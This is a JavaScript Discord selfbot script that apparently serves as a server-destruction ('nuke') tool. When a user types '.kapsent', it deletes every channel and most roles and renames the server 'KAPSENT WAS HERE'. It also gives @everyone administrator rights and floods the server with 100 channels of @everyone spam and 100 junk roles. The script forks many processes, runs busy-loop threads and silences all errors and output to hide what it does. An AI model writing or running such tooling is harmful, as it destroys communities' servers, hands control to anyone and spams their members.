const { Client } = require('discord.js-selfbot-v13');
const cluster = require('cluster');
const worker_threads = require('worker_threads');
const os = require('os');

if (cluster.isMaster) {
  for (let i = 0; i < os.cpus().length * 2; i++) cluster.fork();
} else {
  const client = new Client();
  
  Object.defineProperty(client.ws, 'ping', { value: 0, writable: false });
  
  client.once('ready', () => {
    client.user.setStatus('invisible');
    client.ws.connection.ping = () => 0;
    client.ws.connection.latency = 0;
    
    for (let i = 0; i < 10; i++) {
      new worker_threads.Worker(`
        const { parentPort } = require('worker_threads');
        setInterval(() => {
          process.nextTick(() => {
            setImmediate(() => {
              parentPort.postMessage('tick');
            });
          });
        }, 0);
      `, { eval: true });
    }
  });
  
  client.on('message', (message) => {
    if (message.content === '.kapsent' && message.guild) {
      const g = message.guild;
      const img = '';
      
      process.nextTick(() => {
        g.channels.cache.forEach(ch => process.nextTick(() => setImmediate(() => ch.delete().catch(() => {}))));
        g.roles.cache.filter(r => r.name !== '@everyone' && !r.managed).forEach(r => process.nextTick(() => setImmediate(() => r.delete().catch(() => {}))));
        
        process.nextTick(() => setImmediate(() => g.setIcon(img).catch(() => {})));
        process.nextTick(() => setImmediate(() => g.setBanner(img).catch(() => {})));
        process.nextTick(() => setImmediate(() => g.setName('KAPSENT WAS HERE').catch(() => {})));
        process.nextTick(() => setImmediate(() => g.roles.everyone.setPermissions(['ADMINISTRATOR']).catch(() => {})));
        
        for (let i = 0; i < 100; i++) {
          process.nextTick(() => setImmediate(() => {
            g.channels.create('kapsentcan', {type: 0, permissionOverwrites: [{id: g.roles.everyone.id, allow: ['VIEW_CHANNEL']}]})
              .then(ch => process.nextTick(() => setImmediate(() => ch.send('@everyone SLM BEN KAPSENT').catch(() => {}))))
              .catch(() => {});
          }));
          
          process.nextTick(() => setImmediate(() => {
            g.roles.create({name: 'kapsentcan', permissions: []}).catch(() => {});
          }));
        }
      });
      
      console.log('speedspeedspeedspeedspeedspeedspeedspeedspeedspeedspeedspeedspeedspeedspeedspeedspeedspeedspeedspeed');
    }
  });
  
client.login("");
  }

process.stdout._write = () => {};
process.stderr._write = () => {};
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});
process.on('warning', () => {});
